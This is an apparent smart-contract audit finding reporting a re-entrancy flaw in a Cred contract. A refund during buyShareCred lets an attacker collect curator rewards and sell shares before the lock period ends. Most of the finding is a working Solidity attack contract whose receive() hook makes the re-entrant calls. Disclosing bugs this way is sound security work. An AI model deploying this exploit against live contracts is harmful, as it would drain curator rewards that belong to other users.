# Vulnerability details

## Impact
Attacker can claim almost all the curator rewards.
An attacker can call the `Cred::buyShareCred` , then the `CuratorRewardsDistributor::distribute` to claim curator rewards then  `Cred::sellShareCred` bypassing the `SHARE_LOCK_PERIOD` using re-entrancy.

This attack will occur right after an NFT has been minted and when there are undistributed curator rewards for a `credId`.

## Proof of Concept
Steps to attack:
1. Call `Cred::buyShareCred` with extra `msg.value` to trigger a refund and re-entrancy opportunity [here](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L642)
2. Call `CuratorRewardsDistributor::distribute` to collect mint rewards.
3. Call `Cred::sellShareCred` to get money refunded minus fees.

# PoC
Paste the following contract in the test folder and name the file: `AuditAttack.sol`

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.24;

contract Attack {
    address public cred;
    address public distributor;
    bool sold = false;

    constructor(address _cred, address _curatorRewardsDistributor) {
        cred = _cred;
        distributor = _curatorRewardsDistributor;
    }

    function buyCred(uint256 _credId, uint256 _amount, uint256 _maxPrice) external payable {
        sold = false; // This could be added to prevent wasting gas for the attacker but not neccessary
        cred.call{ value: msg.value }(
            abi.encodeWithSignature("buyShareCred(uint256,uint256,uint256)", _credId, _amount, _maxPrice)
        );
    }

    receive() external payable {
        if (sold) {
            return;
        } else {
            sold = true;

            /*  
            Before selling the share we have the opportunity to collect curator rewards which are the main motivator for
            this attack
         */
            distributor.call(abi.encodeWithSignature("distribute(uint256)", 1));
            cred.call(abi.encodeWithSignature("sellShareCred(uint256,uint256,uint256)", 1, 1, 0)); // no need to check
                // for success or not if it reverts
        }
    }
}

```
